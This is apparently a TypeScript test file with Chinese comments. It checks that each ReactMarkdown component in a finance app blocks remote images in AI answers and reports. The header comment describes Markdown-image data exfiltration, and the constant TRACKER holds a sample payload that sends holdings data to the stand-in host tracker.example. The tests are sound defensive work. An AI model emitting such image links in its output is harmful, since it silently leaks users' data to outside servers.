// Markdown 图片不发请求（第四轮审计）：模型回答、报告、要点都是不可信文字，
// 一句 `![](https://外站/p.gif?d=…)` 不用点击就能把页面上的数据带出去。
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { basename, join } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";
import { createElement } from "react";
import { textOf, withRenderer } from "./helpers/render.ts";

const SRC = fileURLToPath(new URL("../src/", import.meta.url));
const TRACKER = "看这里 ![持仓](https://tracker.example/p.gif?d=600519-100) 结束";

function tsxFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((n) => {
    const p = join(dir, n);
    return statSync(p).isDirectory() ? tsxFiles(p) : p.endsWith(".tsx") ? [p] : [];
  });
}

/** 取出每个 `<ReactMarkdown ...>` 开标签（按花括号配对找到真正的 `>`） */
function openingTags(src: string): string[] {
  const tags: string[] = [];
  for (let i = src.indexOf("<ReactMarkdown"); i >= 0; i = src.indexOf("<ReactMarkdown", i + 1)) {
    let depth = 0, j = i;
    for (; j < src.length; j++) {
      if (src[j] === "{") depth++;
      else if (src[j] === "}") depth--;
      else if (src[j] === ">" && depth === 0) break;
    }
    tags.push(src.slice(i, j + 1));
  }
  return tags;
}

test("每个 ReactMarkdown 都带上图片拦截", () => {
  const covered = new Map<string, number>();
  for (const f of tsxFiles(SRC)) {
    const src = readFileSync(f, "utf8");
    for (const tag of openingTags(src)) {
      const file = basename(f);
      covered.set(file, (covered.get(file) ?? 0) + 1);
      const direct = /components=\{(noRemoteImages|\{\s*\.\.\.noRemoteImages)/.test(tag);
      // ResearchReport 先拼一份 components（第一项就是 ...noRemoteImages）再传进来
      const viaLocal = /components=\{components\}/.test(tag) && /const components: Components = \{\s*\.\.\.noRemoteImages,/.test(src);
      const viaAppendix = /components=\{appendixComponents\}/.test(tag)
        && /const appendixComponents = \{ \.\.\.components \};/.test(src)
        && /const components: Components = \{\s*\.\.\.noRemoteImages,/.test(src);
      assert.ok(direct || viaLocal || viaAppendix, `${f.slice(SRC.length)}：${tag.slice(0, 90)} 没带 noRemoteImages`);
    }
  }
  for (const file of ["AiMessages.tsx", "DebateReport.tsx", "DailyReview.tsx", "Intel.tsx", "Notes.tsx", "ReportAnswer.tsx"]) {
    assert.ok(covered.has(file), `未检查 ${file} 的 Markdown 图片拦截`);
  }
  assert.equal(covered.get("ResearchReport.tsx"), 2, "正文与附录都必须经过拦截检查");
});

test("对话回答和报告问答渲染出来没有 <img>，只留说明文字", async () => {
  await withRenderer(async (r) => {
    const { AiMessages } = await r.load("/src/core/ai/AiMessages.tsx");
    const plain = r.html(AiMessages, { msgs: [{ role: "assistant", content: TRACKER }], loading: false, err: null });
    assert.doesNotMatch(plain, /<img|tracker\.example/);
    assert.match(textOf(plain), /\[图片未加载：持仓\]/);

    const { ResearchReport } = await r.load("/src/verticals/finance/components/ResearchReport.tsx");
    const report = r.html(ResearchReport, { result: {
      run_id: "image-safety", availability: "ready", report: TRACKER, appendix: TRACKER,
    } });
    assert.doesNotMatch(report, /<img|tracker\.example/);
    assert.equal(textOf(report).split("[图片未加载：持仓]").length - 1, 2);

    const { ReportAnswer } = await r.load("/src/verticals/finance/components/ReportAnswer.tsx");
    const { MemoryRouter } = await r.load("react-router-dom");
    const answer = r.html(() => createElement(MemoryRouter, null, createElement(ReportAnswer, { content: TRACKER })), {});
    assert.doesNotMatch(answer, /<img|tracker\.example/);
    assert.match(textOf(answer), /\[图片未加载：持仓\]/);
  });
});

